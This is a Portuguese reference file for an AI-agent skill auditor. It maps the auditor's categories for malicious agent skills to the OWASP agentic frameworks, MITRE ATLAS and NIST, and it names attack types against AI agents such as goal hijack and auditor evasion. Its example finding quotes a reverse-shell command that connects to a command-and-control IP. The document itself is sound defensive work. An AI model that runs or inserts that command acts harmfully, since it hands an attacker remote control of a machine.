# Mapeamento OWASP — ASI 2026 + AST + Categorias do pente-fino

Referência para alinhar achados desta skill com frameworks reconhecidos.
Útil quando o relatório precisa ser apresentado a equipes de segurança que falam
OWASP-ês.

---

## OWASP Top 10 for Agentic Applications 2026 (ASI)

Publicado em dez/2025 pelo OWASP GenAI Security Project.
Fonte: https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/

| ID | Nome | Resumo |
|----|------|--------|
| ASI01 | Agent Goal Hijack | Manipulação dos objetivos/plano do agente (direta, indireta, recursiva) |
| ASI02 | Tool Misuse & Exploitation | Agente usa tool autorizada de forma destrutiva ou tools são exploradas |
| ASI03 | Identity & Privilege Abuse | Agente herda/eleva/compartilha credenciais e privilégios |
| ASI04 | Agentic Supply Chain Vulnerabilities | Ferramentas/MCPs/plugins/templates de terceiros comprometidos |
| ASI05 | Unexpected Code Execution (RCE) | Execução insegura de código gerado dinamicamente |
| ASI06 | Memory & Context Poisoning | Memória/contexto envenenado influencia comportamento futuro |
| ASI07 | Insecure Inter-Agent Communication | Mensagens A2A spoofadas, sem autenticação |
| ASI08 | Cascading Failures | Falhas se propagam em workflows multi-agente |
| ASI09 | Human-Agent Trust Exploitation | Agente usado como cúmplice para enganar o humano |
| ASI10 | Rogue Agents | Agente opera fora do escopo autorizado |

---

## OWASP Agentic Skills Top 10 (AST)

Framework específico para riscos de skills/plugins (separado do ASI mas alinhado).

| ID | Nome | Relevância para pente-fino |
|----|------|------------------------------|
| AST01 | Malicious Skills | **Foco principal do pente-fino** — skills weaponizadas publicadas em registries |
| AST02 | Skill Supply Chain | Dependências, manifests, payloads externos |
| AST03 | Insecure Skill Permissions | Skill pede mais privilégio do que precisa |
| AST04 | Skill Identity Spoofing | Falsa "skill oficial" (visto em clawdhub) |
| AST05 | Hidden Instructions | ASCII smuggling, Unicode invisíveis |
| AST06 | Skill Update Tampering | Versões maliciosas substituem versões legítimas |
| AST07 | Cross-Skill Contamination | Skill A modifica skill B |
| AST08 | Skill-Mediated Exfiltration | Skill como veículo de dados sensíveis |
| AST09 | Insecure Skill Telemetry | Skill envia info de uso pra terceiros |
| AST10 | Skill Sandbox Escape | Skill foge de qualquer isolamento |

---

## Mapeamento Categorias do pente-fino → ASI/AST

| Categoria do pente-fino | ASI 2026 | AST | Notas |
|------------------------|----------|-----|-------|
| 1. Goal Hijack & Prompt Injection | ASI01 | AST01, AST05 | Inclui injection direta, indireta, roleplay |
| 2. Tool Misuse & Exploitation | ASI02 | AST03 | Encadeamento destrutivo de tools |
| 3. Identity & Privilege Abuse / Persistência | ASI03, ASI10 | AST03, AST07 | Inclui rogue agents e persistência |
| 4. Supply Chain Vulnerabilities | ASI04 | AST02, AST06 | Foco em dependências e payloads externos |
| 5. Unexpected Code Execution | ASI05 | AST01 | RCE clássico + reverse shells |
| 6. Memory & Context Poisoning | ASI06 | AST05 | Persistência via memória |
| 7. Data Exfiltration & Covert Channels | ASI02 + ASI03 | AST08 | Vetores diretos e covert |
| 8. Credentials & Secrets | ASI03 | AST08 | Patterns de chaves + instruções LLM-targeted |
| 9. Filesystem Traversal | ASI02 + ASI05 | AST03 | Acesso fora do escopo |
| 10. Crypto / Financial Abuse | ASI02 + ASI03 | AST01 | Vetor financeiro específico (AMOS) |
| 11. Obfuscation & Hidden Content | ASI01 + ASI04 | AST05 | Inclui ASCII smuggling, bidi |
| 12. Human-Agent Trust Exploitation | ASI09 | AST04 | Agente como cúmplice |
| 13. MCP & Inter-Agent | ASI04 + ASI07 | AST02 | MCP poisoning, A2A spoofing |
| 14. Engenharia Social Estrutural | ASI09 | AST04 | Padrões de linguagem manipulativos |
| 15. Meta-attack & Auditor Evasion | ASI01 (meta) | AST05 | Manipular o auditor |

---

## Alinhamentos externos

### CSA MAESTRO Framework
Mapeamento parcial para skills:
- Layer 7 (Agent Ecosystem) — onde skills maliciosas operam
- Layer 5 (Evaluation & Observability) — onde esta skill atua

### MITRE ATLAS
- AML.T0051: LLM Prompt Injection → Categorias 1, 11, 15
- AML.T0054: LLM Jailbreak → Categoria 1
- AML.T0068: LLM Supply Chain Compromise → Categoria 4
- AML.T0049: Discover ML Artifacts → Categorias 7, 8

### NIST AI RMF
- GOVERN 1.5 (third-party software) → Categoria 4
- MAP 5.1 (impact assessment) → Matriz de severidade
- MEASURE 2.7 (adversarial testing) → Justifica esta skill existir

---

## Como apresentar achados a equipes de segurança

Quando o relatório for pra um time de AppSec ou compliance:

1. **Comece pelos IDs OWASP** (ASI/AST), não pelas categorias internas. É a linguagem comum.
2. **Use a severidade calculada** (Impacto × Confiança) — mapeia mentalmente para CVSS.
3. **Cite o IOC específico** se houver — equipes técnicas validam mais rápido.
4. **Recomende a próxima camada** explicitamente — não deixe ambíguo.

Exemplo:
> Achado: trecho `bash -i >& /dev/tcp/91.92.242.30/4444` no arquivo `scripts/setup.sh:42`.
> Classificação: **ASI05 (Unexpected Code Execution) + AST01 (Malicious Skills)**.
> Impacto 5 × Confiança 5 = **25 / CRÍTICO**.
> IOC ClawHavoc 2026 confirmado (C2 IP).
> Recomendação: **REJEITAR**. Não submeter à Camada 2 — é confirmado malicioso.
